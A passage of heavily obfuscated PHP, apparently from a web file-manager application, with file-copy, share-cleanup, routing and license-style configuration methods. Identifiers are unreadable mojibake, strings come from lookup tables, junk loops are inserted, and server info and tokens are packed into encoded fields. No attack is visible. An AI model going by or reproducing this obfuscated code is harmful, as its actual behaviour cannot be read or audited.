= 0; } if ($£šËÁéù) { $¢‡‘ıà½ = array($ÎŸŞº…[575] => array($ÎŸŞº…[535], $ÑÀ¯íÒ”[$ÎŸŞº…[512]] . $ÑÀ¯íÒ”[$ÎŸŞº…[394]] . $ÎŸŞº…[536])); $¸Ğ·ıÍ = $ÑÀ¯íÒ”[$ÎŸŞº…[512]] . $ÑÀ¯íÒ”[$ÎŸŞº…[394]] . $ÎŸŞº…[50]; $Üè×¨¾ = $ß°ó¦´[$ÎŸŞº…[512]] . $ß°ó¦´[$ÎŸŞº…[394]] . $ÎŸŞº…[50] . $ÑÀ¯íÒ”[$ÎŸŞº…[394]] . $ÎŸŞº…[50]; $±ñºèäé = array($ÎŸŞº…[575] => array($ÎŸŞº…[584], "\x72\x65\160\154\x61\143\145\x28\x70\x61\162\x65\156\x74\114\145\166\145\x6c\54\x27{$¸Ğ·ıÍ}\x27\x2c\47{$Üè×¨¾}\x27\x29"), $ÎŸŞº…[571] => $ß°ó¦´[$ÎŸŞº…[403]], $ÎŸŞº…[572] => $ß°ó¦´[$ÎŸŞº…[495]]); if ($ƒû¿Ğ’ƒ) { $±ñºèäé[$ÎŸŞº…[421]] = 0; } $this->where($¢‡‘ıà½)->data($±ñºèäé)->save(); } $this->where(array($ÎŸŞº…[409] => $Ë­ğ¸è))->data($ó§µ•„û)->save(); return $Ë­ğ¸è; } private function clearShare($ÃÅ½ÚÁÈ, $¡‰¸‡©) { $Öãö‹€ã =& $_SERVER[ì…™Î¶Ï]; $“ÌÃşø = $this->sourceInfo($ÃÅ½ÚÁÈ); $Ö’¤ù ş = $this->sourceInfo($¡‰¸‡©); if ($“ÌÃşø[$Öãö‹€ã[495]] == $Ö’¤ù ş[$Öãö‹€ã[495]] && $“ÌÃşø[$Öãö‹€ã[403]] == $Öãö‹€ã[585]) { return; } $ø“˜†æ¿ = array($Öãö‹€ã[512] => array($Öãö‹€ã[535], $“ÌÃşø[$Öãö‹€ã[512]] . $ÃÅ½ÚÁÈ . $Öãö‹€ã[536])); $ó±â—½Â = $this->field($Öãö‹€ã[409])->where($ø“˜†æ¿)->getField($Öãö‹€ã[394], !0); if (!$ó±â—½Â) { return; } $ø“˜†æ¿ = array($Öãö‹€ã[394] => array($Öãö‹€ã[7], $ó±â—½Â), $Öãö‹€ã[486] => 1); $ŒıÉ‘û” = Model($Öãö‹€ã[586])->field($Öãö‹€ã[479])->where($ø“˜†æ¿)->select(); if (!$ŒıÉ‘û”) { return; } $ŒıÉ‘û” = array_to_keyvalue($ŒıÉ‘û”, $Öãö‹€ã[12], $Öãö‹€ã[479]); $ø“˜†æ¿ = array($Öãö‹€ã[479] => array($Öãö‹€ã[7], $ŒıÉ‘û”)); Model($Öãö‹€ã[586])->where($ø“˜†æ¿)->save(array($Öãö‹€ã[486] => 0)); Model($Öãö‹€ã[587])->where($ø“˜†æ¿)->delete(); } public function copyFolderFromIO($Ø®Ì»­Õ, $óÀàôï, $ğíÔàã³, $ÂõÆëˆğ, $€ˆÛóÛê, $Ë‰…ı·Œ = false) { $Õ¨î¢¡ =& $_SERVER[ì…™Î¶Ï]; $¡ÂšÓòˆ = array($Õ¨î¢¡[552] => array(), $Õ¨î¢¡[553] => array(), $Õ¨î¢¡[551] => array(), $Õ¨î¢¡[588] => array()); $Ïîªı² = $Ë‰…ı·Œ ? $Ë‰…ı·Œ : $Ø®Ì»­Õ->pathThis($óÀàôï); $•ÅÕéé = $this->fileNameExist($ğíÔàã³, $Ïîªı²); $Ç§±œòŞ = $this->mkdir($ğíÔàã³, $Ïîªı², $ÂõÆëˆğ); if (!$•ÅÕéé || $ÂõÆëˆğ == REPEAT_RENAME_FOLDER) { $ÂõÆëˆğ = !1; } if ($•ÅÕéé) { $this->_childrenAllMake($•ÅÕéé); } Hook::trigger($Õ¨î¢¡[589]); $this->_copyChildTo($Ø®Ì»­Õ, $óÀàôï, $Ç§±œòŞ, $ÂõÆëˆğ, $¡ÂšÓòˆ, $€ˆÛóÛê); Hook::trigger($Õ¨î¢¡[590]); if ($Ç§±œòŞ) { $this->folderSizeResetChildren($Ç§±œòŞ); } $this->_childrenListClear(); Model($Õ¨î¢¡[554])->addAll($¡ÂšÓòˆ[$Õ¨î¢¡[552]], array(), !0); Model($Õ¨î¢¡[555])->eventCopy($Ç§±œòŞ); $this->saveAll($¡ÂšÓòˆ[$Õ¨î¢¡[553]]); Model($Õ¨î¢¡[461])->linkAdd($¡ÂšÓòˆ[$Õ¨î¢¡[551]]); Model($Õ¨î¢¡[461])->remove($¡ÂšÓòˆ[$Õ¨î¢¡[588]]); $this->folderSizeReset($ğíÔàã³); $this->updateModifyTime($ğíÔàã³); return $Ç§±œòŞ; } private function _copyChildTo($—ÙîÆÖ, $˜³‚Æ«Ç, $ãõ³Õº¨, $í—ª•›…, &$Àç“Ô„…, $Ââ×åœ) { $ø£İˆ‡Î =& $_SERVER[ì…™Î¶Ï]; $Üô²õ¸ª = $this->sourceInfoCache($ãõ³Õº¨); $³àé‚êÂ = $—ÙîÆÖ->listPath($˜³‚Æ«Ç); $³àé‚êÂ = $³àé‚êÂ ? $³àé‚êÂ : array($ø£İˆ‡Î[76] => array(), $ø£İˆ‡Î[77] => array()); $æ´Ë‰í = array_merge($³àé‚êÂ[$ø£İˆ‡Î[76]], $³àé‚êÂ[$ø£İˆ‡Î[77]]); $÷Ò’»Â‘ = $this->_addFiles($—ÙîÆÖ, $³àé‚êÂ[$ø£İˆ‡Î[76]], $Ââ×åœ); $š¨æ®á = array(); foreach ($æ´Ë‰í as &$şÑ÷Û˜¥) { if (isset($÷Ò’»Â‘[$şÑ÷Û˜¥[$ø£İˆ‡Î[32]]])) { $şÑ÷Û˜¥ = $÷Ò’»Â‘[$şÑ÷Û˜¥[$ø£İˆ‡Î[32]]]; } $şÑ÷Û˜¥[$ø£İˆ‡Î[402]] = $şÑ÷Û˜¥[$ø£İˆ‡Î[33]] == $ø£İˆ‡Î[79]; $şÑ÷Û˜¥[$ø£İˆ‡Î[404]] = _get($şÑ÷Û˜¥, $ø£İˆ‡Î[167], $ø£İˆ‡Î[12]); $şÑ÷Û˜¥[$ø£İˆ‡Î[80]] = _get($şÑ÷Û˜¥, $ø£İˆ‡Î[80], 0); $şÑ÷Û˜¥[$ø£İˆ‡Î[458]] = _get($şÑ÷Û˜¥, $ø£İˆ‡Î[458], 0); if (!isset($şÑ÷Û˜¥[$ø£İˆ‡Î[591]]) && $şÑ÷Û˜¥[$ø£İˆ‡Î[458]]) { $Àç“Ô„…[$ø£İˆ‡Î[588]][] = $şÑ÷Û˜¥[$ø£İˆ‡Î[458]]; } if ($í—ª•›…) { $¾àçŞòø = $this->fileNameExistCache($ãõ³Õº¨, $şÑ÷Û˜¥[$ø£İˆ‡Î[32]]); if ($¾àçŞòø) { if ($şÑ÷Û˜¥[$ø£İˆ‡Î[402]] || $í—ª•›… == REPEAT_SKIP) { continue; } if ($í—ª•›… == REPEAT_REPLACE) { $èÚ»Ïô = $this->sourceInfoCache($¾àçŞòø); $ö‹ÉÄÔ = $this->fileHistory($èÚ»Ïô, $şÑ÷Û˜¥[$ø£İˆ‡Î[458]], $şÑ÷Û˜¥[$ø£İˆ‡Î[80]]); if ($ö‹ÉÄÔ) { $Àç“Ô„…[$ø£İˆ‡Î[551]][] = $şÑ÷Û˜¥[$ø£İˆ‡Î[458]]; } continue; } else { if ($í—ª•›… == REPEAT_RENAME) { $şÑ÷Û˜¥[$ø£İˆ‡Î[32]] = $this->fileNameAutoCache($ãõ³Õº¨, $şÑ÷Û˜¥[$ø£İˆ‡Î[32]], $í—ª•›…, !1); } } } } if (!$şÑ÷Û˜¥[$ø£İˆ‡Î[402]] && $şÑ÷Û˜¥[$ø£İˆ‡Î[458]] == 0) { continue; } if (!$şÑ÷Û˜¥[$ø£İˆ‡Î[402]] && $şÑ÷Û˜¥[$ø£İˆ‡Î[458]]) { $Àç“Ô„…[$ø£İˆ‡Î[551]][] = $şÑ÷Û˜¥[$ø£İˆ‡Î[458]]; } $š¨æ®á[] = $this->_makeItemData($şÑ÷Û˜¥, $Üô²õ¸ª, $şÑ÷Û˜¥[$ø£İˆ‡Î[32]]); } unset($şÑ÷Û˜¥); if (!empty($š¨æ®á)) { $this->addAll($š¨æ®á); $this->_childrenListSelect($ãõ³Õº¨); } $¥Ğ¨²™ = $this->_childrenList($ãõ³Õº¨); $¥Ğ¨²™ = array_to_keyvalue($¥Ğ¨²™, $ø£İˆ‡Î[32]); foreach ($æ´Ë‰í as $şÑ÷Û˜¥) { $èÚ»Ïô = $¥Ğ¨²™[$şÑ÷Û˜¥[$ø£İˆ‡Î[32]]]; $­ª®§‹ = $èÚ»Ïô[$ø£İˆ‡Î[394]]; $this->_copyApplyMeta($èÚ»Ïô, $Àç“Ô„…); if ($şÑ÷Û˜¥[$ø£İˆ‡Î[33]] == $ø£İˆ‡Î[79]) { $şÑ÷Û˜¥[$ø£İˆ‡Î[78]] = $—ÙîÆÖ->getPathInner($şÑ÷Û˜¥[$ø£İˆ‡Î[78]]); $this->_copyChildTo($—ÙîÆÖ, $şÑ÷Û˜¥[$ø£İˆ‡Î[78]], $­ª®§‹, $í—ª•›…, $Àç“Ô„…, $Ââ×åœ); } } } private function _addFiles($¢ÛŞ”Ïâ, $¼È›õÒ×, $³õçÂ½õ) { $”Á‘²»· =& $_SERVER[ì…™Î¶Ï]; if (!$¼È›õÒ× || count($¼È›õÒ×) == 0) { return array(); } $€ô›˜Ì¸ = array(); foreach ($¼È›õÒ× as &$Õûåü›œ) { Hook::trigger($”Á‘²»·[592], $Õûåü›œ); $Õûåü›œ[$”Á‘²»·[78]] = $¢ÛŞ”Ïâ->getPathInner($Õûåü›œ[$”Á‘²»·[78]]); $¥·ˆÊ¤í = $¢ÛŞ”Ïâ->hashSimple($Õûåü›œ[$”Á‘²»·[78]]); $ÍÇìËÄÀ = $¢ÛŞ”Ïâ->hashMd5($Õûåü›œ[$”Á‘²»·[78]]); if (strlen($ÍÇìËÄÀ) > 10 && !isset($€ô›˜Ì¸[$ÍÇìËÄÀ])) { $€ô›˜Ì¸[$ÍÇìËÄÀ] = array(); } $Õûåü›œ[$”Á‘²»·[170]] = $¥·ˆÊ¤í; $Õûåü›œ[$”Á‘²»·[169]] = $ÍÇìËÄÀ; Hook::trigger($”Á‘²»·[593], $Õûåü›œ); $€ô›˜Ì¸[$ÍÇìËÄÀ][] =& $Õûåü›œ; if (count($€ô›˜Ì¸[$ÍÇìËÄÀ]) > 1) { $Õûåü›œ[$”Á‘²»·[591]] = !0; } } unset($Õûåü›œ); $ø‘ÎØÌå = array($”Á‘²»·[169] => array($”Á‘²»·[7], array_keys($€ô›˜Ì¸))); $—˜˜³ÒÁ = Model($”Á‘²»·[594]); $À¶Ğ’¹¬ = $—˜˜³ÒÁ->where($ø‘ÎØÌå)->select(); $À¶Ğ’¹¬ = $À¶Ğ’¹¬ ? $À¶Ğ’¹¬ : array(); foreach ($À¶Ğ’¹¬ as $°ŠÔ¿¡ñ) { if (!isset($€ô›˜Ì¸[$°ŠÔ¿¡ñ[$”Á‘²»·[169]]])) { continue; } $°¹©õÒÈ = $€ô›˜Ì¸[$°ŠÔ¿¡ñ[$”Á‘²»·[169]]]; foreach ($°¹©õÒÈ as &$Õûåü›œ) { $Õûåü›œ[$”Á‘²»·[458]] = $°ŠÔ¿¡ñ[$”Á‘²»·[458]]; $Õûåü›œ[$”Á‘²»·[591]] = !0; } unset($Õûåü›œ); } $—ÇöƒüÈ = array(); foreach ($¼È›õÒ× as $›İİ³¹Ÿ) { if (isset($›İİ³¹Ÿ[$”Á‘²»·[591]]) && $›İİ³¹Ÿ[$”Á‘²»·[591]]) { continue; } $´ºÜ‘Ãæ = $¢ÛŞ”Ïâ->getPathInner($›İİ³¹Ÿ[$”Á‘²»·[78]]); $À¯³Ğ æ = $—˜˜³ÒÁ->addFileMake($´ºÜ‘Ãæ, $›İİ³¹Ÿ[$”Á‘²»·[80]], $›İİ³¹Ÿ[$”Á‘²»·[170]], $›İİ³¹Ÿ[$”Á‘²»·[169]], $›İİ³¹Ÿ[$”Á‘²»·[32]], $³õçÂ½õ); if (!is_array($À¯³Ğ æ)) { continue; } $—ÇöƒüÈ[] = $À¯³Ğ æ; } $—˜˜³ÒÁ->addAll($—ÇöƒüÈ); $ø‘ÎØÌå = array($”Á‘²»·[169] => array($”Á‘²»·[7], array_keys($€ô›˜Ì¸))); $À¶Ğ’¹¬ = $—˜˜³ÒÁ->where($ø‘ÎØÌå)->select(); $À¶Ğ’¹¬ = $À¶Ğ’¹¬ ? $À¶Ğ’¹¬ : array(); foreach ($À¶Ğ’¹¬ as $°ŠÔ¿¡ñ) { if (!isset($€ô›˜Ì¸[$°ŠÔ¿¡ñ[$”Á‘²»·[169]]])) { continue; } $Ö”õ¬í± =& $€ô›˜Ì¸[$°ŠÔ¿¡ñ[$”Á‘²»·[169]]]; foreach ($Ö”õ¬í± as &$Õûåü›œ) { $Õûåü›œ[$”Á‘²»·[458]] = $°ŠÔ¿¡ñ[$”Á‘²»·[458]]; } unset($Õûåü›œ); } $¯çšÆÔı = array(); foreach ($¼È›õÒ× as $’œªòœÍ) { $¯çšÆÔı[$’œªòœÍ[$”Á‘²»·[32]]] = $’œªòœÍ; } return $¯çšÆÔı; } } goto Eƒİµ•ºš; FÇßÅ¹¾æ£: define($_SERVER[ì…™Î¶Ï][233], 1); define($_SERVER[ì…™Î¶Ï][234], 2); define($_SERVER[ì…™Î¶Ï][235], 3); goto FÛ±îÂš; dÉëçÖ‚ÚÆ: class Application { private $defaultModule = "\x69\x6e\x64\145\170"; private $defaultController = "\151\156\x64\x65\170"; private $defaultAction = "\x69\x6e\x64\145\x78"; function __construct() { } public function setDefault($°†ñ‡£ö) { $½Ã¾ôÙÛ =& $_SERVER[Ú°³Çñ€]; $şÊ¡½ïº = explode($½Ã¾ôÙÛ[0], trim($°†ñ‡£ö, $½Ã¾ôÙÛ[0])); $•‰å­“¤ = $_SERVER[ì…™Î¶Ï][603]; $this->defaultModule = $şÊ¡½ïº[0] ? $şÊ¡½ïº[0] : $this->defaultModule; $this->defaultController = $şÊ¡½ïº[1] ? $şÊ¡½ïº[1] : $this->defaultController; $this->defaultAction = $şÊ¡½ïº[2] ? $şÊ¡½ïº[2] : $this->defaultAction; $this->bgzrfa125829($½Ã¾ôÙÛ[1], array($this, $½Ã¾ôÙÛ[2])); } public function appRun($ş¸Ì¿ıÇ) { $ÎáµóÓî =& $_SERVER[ì…™Î¶Ï]; $ê†¾ïè‹ =& $_SERVER[Ú°³Çñ€]; $úÂ÷ğéı = explode($ê†¾ïè‹[0], $ş¸Ì¿ıÇ); $ßĞ¼ò¥Å = strtolower($úÂ÷ğéı[0]); $òÕèîˆÈ = $ê†¾ïè‹[3]; $«ØÏìğò = $ÎáµóÓî[604]; while ($«ØÏìğò < $ÎáµóÓî[605]) { if ($«ØÏìğò >= 0) { break; } $«ØÏìğò++; } if ($ßĞ¼ò¥Å == $ê†¾ïè‹[4]) { $òÕèîˆÈ = $ê†¾ïè‹[5]; $úÂ÷ğéı[0] = $ê†¾ïè‹[6]; $úÂ÷ğéı[1] = $úÂ÷ğéı[1] . $ê†¾ïè‹[7]; $ş¸Ì¿ıÇ = join($ê†¾ïè‹[0], $úÂ÷ğéı); $ş¸Ì¿ıÇ = trim($ş¸Ì¿ıÇ, $ê†¾ïè‹[0]); } call_user_func(array($ê†¾ïè‹[8], $ê†¾ïè‹[9]), $òÕèîˆÈ . $ê†¾ïè‹[10], $ş¸Ì¿ıÇ); ActionCall($ş¸Ì¿ıÇ); $Ò¬›Â‚¨ = $ÎáµóÓî[606]; while (strlen($Ò¬›Â‚¨) < $ÎáµóÓî[598]) { if (!$Ò¬›Â‚¨) { break; } $Ò¬›Â‚¨++; } call_user_func(array($ê†¾ïè‹[8], $ê†¾ïè‹[9]), $òÕèîˆÈ . $ê†¾ïè‹[11], $ş¸Ì¿ıÇ); } private function autorun() { $ˆÓ§‘°Š =& $_SERVER[Ú°³Çñ€]; global $config; if (count($config[$ˆÓ§‘°Š[12]]) == 0) { return; } foreach ($config[$ˆÓ§‘°Š[12]] as $´ııÙºÉ => $­¦Ëªı) { $this->appRun($­¦Ëªı); } } private function xlnjc537ab89() { $ï°™³Â³ =& $_SERVER[ì…™Î¶Ï]; $å·áô‡Â =& $_SERVER[Ú°³Çñ€]; $àÂªÍ¨ = $å·áô‡Â[4]; $¸ªŒ¦òî = $GLOBALS[$å·áô‡Â[13]][$å·áô‡Â[14]][0]; if (!$¸ªŒ¦òî || strlen($¸ªŒ¦òî) <= strlen($àÂªÍ¨)) { return; } if (strtolower(substr($¸ªŒ¦òî, -strlen($àÂªÍ¨))) != $àÂªÍ¨) { return; } $ùÌÈ¢ûĞ = substr($¸ªŒ¦òî, 0, -strlen($àÂªÍ¨)); $òãö—İ„ = $ï°™³Â³[607]; if (strlen($òãö—İ„) < $ï°™³Â³[608]) { die; } $à÷®ñŸ¼ = array($å·áô‡Â[4], $ùÌÈ¢ûĞ); $Ê›¾şï = $ï°™³Â³[609]; $âË“·¼Ò = array_slice($GLOBALS[$å·áô‡Â[13]][$å·áô‡Â[14]], 1); $³Ä«Ô‘ = $ï°™³Â³[610]; while ($³Ä«Ô‘ < $ï°™³Â³[608]) { if ($³Ä«Ô‘ >= 0) { break; } $³Ä«Ô‘++; } $GLOBALS[$å·áô‡Â[13]][$å·áô‡Â[14]] = array_merge($à÷®ñŸ¼, $âË“·¼Ò); $GLOBALS[$å·áô‡Â[13]][$å·áô‡Â[15]] = implode($å·áô‡Â[0], $GLOBALS[$å·áô‡Â[13]][$å·áô‡Â[14]]); } private function cwqz0fb1e7c9() { $¡„µÙ÷ =& $_SERVER[ì…™Î¶Ï]; $¯óÔ¼¶ =& $_SERVER[Ú°³Çñ€]; if ($GLOBALS[$¯óÔ¼¶[13]][$¯óÔ¼¶[15]] != $¯óÔ¼¶[6]) { return; } $™ƒ·’í = $_SERVER[$¯óÔ¼¶[16]]; $ó“İ¿„å = $¡„µÙ÷[611]; $Ãˆ¡¡Òê = $¯óÔ¼¶[17]; if (!strstr($™ƒ·’í, $Ãˆ¡¡Òê)) { return; } $€ºûšÃê = strrpos($™ƒ·’í, $Ãˆ¡¡Òê); $¼­¨½Üå = $¡„µÙ÷[612]; if (!$¼­¨½Üå) { return; } $èí÷‰…Ã = substr($™ƒ·’í, $€ºûšÃê + strlen($Ãˆ¡¡Òê)); preg_match_all($¯óÔ¼¶[18], $èí÷‰…Ã, $úÊ›Õ˜Ò); $€É¹Ş©™ = $¡„µÙ÷[613]; $èí÷‰…Ã = trim($úÊ›Õ˜Ò[0][0], $¯óÔ¼¶[19]); $GLOBALS[$¯óÔ¼¶[13]][$¯óÔ¼¶[14]] = explode($¯óÔ¼¶[19], $èí÷‰…Ã); $GLOBALS[$¯óÔ¼¶[13]][$¯óÔ¼¶[15]] = implode($¯óÔ¼¶[0], $GLOBALS[$¯óÔ¼¶[13]][$¯óÔ¼¶[14]]); $Ø˜Á·Âê = $¡„µÙ÷[614]; if (strlen($Ø˜Á·Âê) < $¡„µÙ÷[608]) { return; } } public function run() { $«ÄâèÎì =& $_SERVER[ì…™Î¶Ï]; $‰® ‡¢‹ =& $_SERVER[Ú°³Çñ€]; $this->cwqz0fb1e7c9(); $¹±ùÚà¾ = $«ÄâèÎì[615]; while ($¹±ùÚà¾ < $«ÄâèÎì[602]) { if ($¹±ùÚà¾ >= 0) { break; } $¹±ùÚà¾++; } $this->xlnjc537ab89(); $î´ø£’‘ = $GLOBALS[$‰® ‡¢‹[13]][$‰® ‡¢‹[14]]; $ìÕ £Ìğ = $«ÄâèÎì[616]; if (!$ìÕ £Ìğ) { return; } $äŒ¡ğç€ = $GLOBALS[$‰® ‡¢‹[13]][$‰® ‡¢‹[15]]; define($‰® ‡¢‹[20], isset($î´ø£’‘[0]) && $î´ø£’‘[0] ? $î´ø£’‘[0] : $this->defaultModule); define($‰® ‡¢‹[21], isset($î´ø£’‘[1]) && $î´ø£’‘[0] ? $î´ø£’‘[1] : $this->defaultController); define($‰® ‡¢‹[22], isset($î´ø£’‘[2]) && $î´ø£’‘[0] ? $î´ø£’‘[2] : $this->defaultAction); $ò¯İå = $«ÄâèÎì[617]; while ($ò¯İå < $«ÄâèÎì[618]) { if ($ò¯İå >= 0) { break; } $ò¯İå++; } define($‰® ‡¢‹[23], MOD . $‰® ‡¢‹[0] . ST . $‰® ‡¢‹[0] . ACT); $_SERVER[$‰® ‡¢‹[24]] = strtolower(ACTION); $ï¬†Òª† = $«ÄâèÎì[619]; $this->autorun(); if (count($î´ø£’‘) >= 3) { $this->appRun($äŒ¡ğç€); } else { $this->appRun(ACTION); } } private $aftr2b577768 = array(); private $wnqp5ad7fc40 = ''; public function yutk084b230a() { $¦ëŒëÁØ =& $_SERVER[ì…™Î¶Ï]; $×ŠÔ…ñ =& $_SERVER[Ú°³Çñ€]; $this->cmpid5c1b294(); $¿Æ‘É÷ = $¦ëŒëÁØ[620]; $this->hmxzf15fa574(); $this->iwcj489b4e47(); $õ¨—¸”ª = $¦ëŒëÁØ[621]; if (!$õ¨—¸”ª) { return; } $this->kbmn3adaf35b(); $this->iwvac629dabb(); $this->fdqud958ceea(); $this->yjhk682394b3(); $ÔÛ¬ã–± = $¦ëŒëÁØ[622]; if (!$ÔÛ¬ã–±) { return; } $this->bgzrfa125829($×ŠÔ…ñ[25], array($this, $×ŠÔ…ñ[26])); $êŒİø˜ = $¦ëŒëÁØ[623]; if (strlen($êŒİø˜) < $¦ëŒëÁØ[598]) { return; } $this->bgzrfa125829($×ŠÔ…ñ[27], array($this, $×ŠÔ…ñ[28])); $…ãèñú = $¦ëŒëÁØ[624]; if (strlen($…ãèñú) < $¦ëŒëÁØ[605]) { return; } $this->bgzrfa125829($×ŠÔ…ñ[29], array($this, $×ŠÔ…ñ[30])); $şşôŒÑŒ = $¦ëŒëÁØ[625]; if (strlen($şşôŒÑŒ) < $¦ëŒëÁØ[602]) { return; } $this->bgzrfa125829($×ŠÔ…ñ[31], array($this, $×ŠÔ…ñ[32])); $Ä½™ïØ = $¦ëŒëÁØ[626]; } public function uezqaaba7476($Ï´óŒé) { $£á¿õß =& $_SERVER[ì…™Î¶Ï]; $Œ±‰şÊâ =& $_SERVER[Ú°³Çñ€]; $¼”ªŸæ€ = Model($Œ±‰şÊâ[33])->get(); $²ÈËŸ®¥ = array($Œ±‰şÊâ[34], $Œ±‰şÊâ[35], $Œ±‰şÊâ[36], $Œ±‰şÊâ[37], $Œ±‰şÊâ[38], $Œ±‰şÊâ[39], $Œ±‰şÊâ[40], $Œ±‰şÊâ[41], $Œ±‰şÊâ[42], $Œ±‰şÊâ[43], $Œ±‰şÊâ[44], $Œ±‰şÊâ[45], $Œ±‰şÊâ[46], $Œ±‰şÊâ[47], $Œ±‰şÊâ[48], $Œ±‰şÊâ[49], $Œ±‰şÊâ[50], $Œ±‰şÊâ[51], $Œ±‰şÊâ[52], $Œ±‰şÊâ[53], $Œ±‰şÊâ[54], $Œ±‰şÊâ[55], $Œ±‰şÊâ[56], $Œ±‰şÊâ[57], $Œ±‰şÊâ[58], $Œ±‰şÊâ[59], $Œ±‰şÊâ[60], $Œ±‰şÊâ[61], $Œ±‰şÊâ[62], $Œ±‰şÊâ[63], $Œ±‰şÊâ[64], $Œ±‰şÊâ[65], $Œ±‰şÊâ[66], $Œ±‰şÊâ[67], $Œ±‰şÊâ[68], $Œ±‰şÊâ[69], $Œ±‰şÊâ[70], $Œ±‰şÊâ[71], $Œ±‰şÊâ[72], $Œ±‰şÊâ[73], $Œ±‰şÊâ[74], $Œ±‰şÊâ[75], $Œ±‰şÊâ[76], $Œ±‰şÊâ[77], $Œ±‰şÊâ[78], $Œ±‰şÊâ[79], $Œ±‰şÊâ[80], $Œ±‰şÊâ[81], $Œ±‰şÊâ[82]); foreach ($²ÈËŸ®¥ as $’óÏ§Ğ×) { $ù°ÏÁÛê = $GLOBALS[$Œ±‰şÊâ[83]][$Œ±‰şÊâ[84]][$’óÏ§Ğ×]; if (isset($¼”ªŸæ€[$’óÏ§Ğ×])) { $ù°ÏÁÛê = $¼”ªŸæ€[$’óÏ§Ğ×]; } $Ï´óŒé[$Œ±‰şÊâ[85]][$Œ±‰şÊâ[86]][$’óÏ§Ğ×] = $ù°ÏÁÛê; } $Úê™Ö‰ê = $Ï´óŒé[$Œ±‰şÊâ[85]][$Œ±‰şÊâ[86]][$Œ±‰şÊâ[46]]; $¨İ¼ÌÎÉ = $£á¿õß[627]; if (!$¨İ¼ÌÎÉ) { return; } unset($Ï´óŒé[$Œ±‰şÊâ[85]][$Œ±‰şÊâ[87]][$Œ±‰şÊâ[88]]); unset($Ï´óŒé[$Œ±‰şÊâ[85]][$Œ±‰şÊâ[87]][$Œ±‰şÊâ[89]]); unset($Ï´óŒé[$Œ±‰şÊâ[85]][$Œ±‰şÊâ[86]][$Œ±‰şÊâ[46]]); unset($Ï´óŒé[$Œ±‰şÊâ[85]][$Œ±‰şÊâ[86]][$Œ±‰şÊâ[90]]); $÷ãÎìÕ… = $£á¿õß[628]; if (!$÷ãÎìÕ…) { return; } $Ï´óŒé[$Œ±‰şÊâ[85]][$Œ±‰şÊâ[86]][$Œ±‰şÊâ[91]] = array($Œ±‰şÊâ[92] => (int) $Úê™Ö‰ê[$Œ±‰şÊâ[93]], $Œ±‰şÊâ[94] => (int) _get($Úê™Ö‰ê, $Œ±‰şÊâ[95], 0)); $€ĞƒËŠ = $£á¿õß[629]; while ($€ĞƒËŠ < $£á¿õß[598]) { if ($€ĞƒËŠ >= 0) { break; } $€ĞƒËŠ++; } $Ï´óŒé[$Œ±‰şÊâ[96]][$Œ±‰şÊâ[97]] = Action($Œ±‰şÊâ[98])->accessToken(); $Ï´óŒé[$Œ±‰şÊâ[96]][$Œ±‰şÊâ[99]] = md5($_SERVER[$Œ±‰şÊâ[100]] . $¼”ªŸæ€[$Œ±‰şÊâ[101]]); $¡•õÛÒ = $£á¿õß[630]; $Ï´óŒé[$Œ±‰şÊâ[96]][$Œ±‰şÊâ[102]] = base64_encode(serverInfo()); $Ï´óŒé[$Œ±‰şÊâ[96]][$Œ±‰şÊâ[103]] = $this->wnqp5ad7fc40; if ($¼”ªŸæ€[$Œ±‰şÊâ[103]] != $Œ±‰şÊâ[104]) { $Ï´óŒé[$Œ±‰şÊâ[96]][$Œ±‰şÊâ[105]] = $¼”ªŸæ€[$Œ±‰şÊâ[105]]; $Ï´óŒé[$Œ±‰şÊâ[96]][$Œ±‰şÊâ[106]] = $¼”ªŸæ€[$Œ±‰şÊâ[106]]; $¼„Ššø­ = rand_string(10) . $this->wnqp5ad7fc40 . rand_string(5); $Ï´óŒé[$Œ±‰şÊâ[85]][$Œ±‰şÊâ[107]][$Œ±‰şÊâ[108]] = $this->jdhz4867fa0e($¼„Ššø­, $Ï´óŒé[$Œ±‰şÊâ[96]][$Œ±‰şÊâ[99]]); } if ($this->wnqp5ad7fc40 == $Œ±‰şÊâ[104]) { $Ï´óŒé[$Œ±‰şÊâ[85]][$Œ±‰şÊâ[86]][$Œ±‰şÊâ[91]][$Œ±‰şÊâ[95]] = 0; } $Ï´óŒé[$Œ±‰şÊâ[96]][$Œ±‰şÊâ[109]] = _get($this->aftr2b577768, $Œ±‰şÊâ[110], $Œ±‰şÊâ[6]); $Ï´óŒé[$Œ±‰şÊâ[96]][$Œ±‰şÊâ[111]] = _get($this->aftr2b577768, $Œ±‰şÊâ[112], $Œ±‰şÊâ[6]); $ö»â¿À… = $£á¿õß[631]; if (strlen($ö»â¿À…) < $£á¿õß[618]) { die; } if (_get($GLOBALS, $Œ±‰şÊâ[113]) && $this->config[$Œ±‰şÊâ[114]]) { $Ï´óŒé[$Œ±‰şÊâ[96]][$Œ±‰şÊâ[115]] = WEB_ROOT; } return $Ï´óŒé; } private function fdqud958ceea() { $¡†Ÿ¾ö =& $_SERVER[ì…™Î¶Ï]; $ÖÚä‘ƒ =& $_SERVER[Ú°³Çñ€]; if ($_SERVER[$ÖÚä‘ƒ[24]] == $ÖÚä‘ƒ[116]) { $·×ò½™ã = array($ÖÚä‘ƒ[103] => $this->wnqp5ad7fc40, $ÖÚä‘ƒ[117] => $this->uvgz8ede6dbe(), $ÖÚä‘ƒ[118] => Model($ÖÚä‘ƒ[119])->count()); if ($this->wnqp5ad7fc40 != $ÖÚä‘ƒ[104]) { $ñœÅ÷ãÕ = _get($this->aftr2b577768, $ÖÚä‘ƒ[120]); if ($ñœÅ÷ãÕ) { $·×ò½™ã[$ÖÚä‘ƒ[121]] = $ñœÅ÷ãÕ; $·×ò½™ã[$ÖÚä‘ƒ[122]] = strtotime(_get($this->aftr2b577768, $ÖÚä‘ƒ[123])); $·×ò½™ã[$ÖÚä‘ƒ[124]] = _get($this->aftr2b577768, $ÖÚä‘ƒ[112]); } $í®Ù¼âÌ = Model($ÖÚä‘ƒ[33])->get($ÖÚä‘ƒ[125], $ÖÚä‘ƒ[6], !0); if (is_string($í®Ù¼âÌ) && substr($í®Ù¼âÌ, 0, 1) == $ÖÚä‘ƒ[126]) { $í®Ù¼âÌ = json_decode_force($í®Ù¼âÌ); } if (is_array($í®Ù¼âÌ) && $í®Ù¼âÌ[$ÖÚä‘ƒ[127]] && strstr($í®Ù¼âÌ[$ÖÚä‘ƒ[127]], $ÖÚä‘ƒ[128])) { $Ó××¯©˜ = explode($ÖÚä‘ƒ[128], $í®Ù¼âÌ[$ÖÚä‘ƒ[127]]); $·×ò½™ã[$ÖÚä‘ƒ[129]] = $Ó××¯©˜[0]; } } $·×ò½™ã = $this->yzwqdf8acb0b(json_encode($·×ò½™ã), 